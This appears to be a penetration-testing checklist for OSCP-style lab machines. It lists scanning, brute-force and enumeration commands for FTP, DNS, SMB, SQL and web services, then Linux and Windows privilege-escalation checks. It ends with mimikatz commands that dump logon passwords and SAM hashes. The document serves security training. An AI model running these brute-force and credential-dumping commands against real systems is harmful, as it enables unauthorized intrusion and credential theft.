### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
### Foothold
- 21
	- ftp anonymous@$IP
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- DNS
	- nslookup
		- server $IP
		- 127.0.0.1
	- dig @$IP domain
		- If domain resolves
			- dig axfr @$IP domain
- RPC/ SMB
	- enum4linux $IP
	- crackmapexec smb $IP -u guest -p "" --rid-brute
	- crackmapexec smb $IP -u "" -p "" --pass-pol
	- rpcclient -U '' $IP
		- enumdomusers
		- queryusergroups RID
		- queryuser RID
- 445
	- smbclient -N -L //$IP
	- nmap --script smb-vuln* -p135,139,445 $IP
- SQL
	- Mysql
		- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP
	- Postgres
		- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$IP
- 80
	- Default landing page
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Subomdain Brute force
		- wfuzz -u machine.name -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
		- knockpy machine.name
			- Run directory brute on all found subdomains
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- USERNAME
	- id
	- Root drive directory
	- sudo -l
	- uname -a
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- Users with console
	- netstat -ano
		- Active ports
	- Directories to check
		- /opt
			- Check GTFO Bins. Treated as SUID
		- /etc/crontab
	- linpeas
		- Possible Exploits
		- Interesting Files
	- pspy64
#### Windows
- USERNAME
	- whoami /all
	- Root drive directory
	- net user USERNAME
		- Check group memberships
	- systeminfo
		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
	- history
		- (Get-PSReadLineOption).HistorySavePath
	- Users with console
	- Services
		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
		- Unquoted
			- cmd
				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
				- wmic service get name,displayname,pathname
			- PS1
				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
			- icacls Filepath before .exe
				- Looking for W or F
	- netstat -ano
		- Active ports
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
### Credentials
### Lessons Learned
